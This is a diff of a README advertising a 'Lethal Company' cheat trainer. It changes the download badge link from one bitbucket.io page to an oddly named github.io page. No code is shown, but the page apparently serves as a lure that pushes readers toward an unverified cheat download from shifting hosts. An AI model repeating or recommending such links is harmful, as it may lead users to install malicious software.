@@ -4,7 +4,7 @@
 
 If you're deep into **Lethal Company** and fed up with low scrap hauls, monster jumpscares, or slow teammates dragging you down, the **Lethal Company Trainer** is your one-way ticket to easy wins. Designed for speed, simplicity, and domination, this trainer drops all the essentials in one sleek package.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload15.bitbucket.io)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://Lethal-Company-Trainer-zuz.github.io/.github)
 ---
 
 ## 🎮 What Is a Lethal Company Trainer?
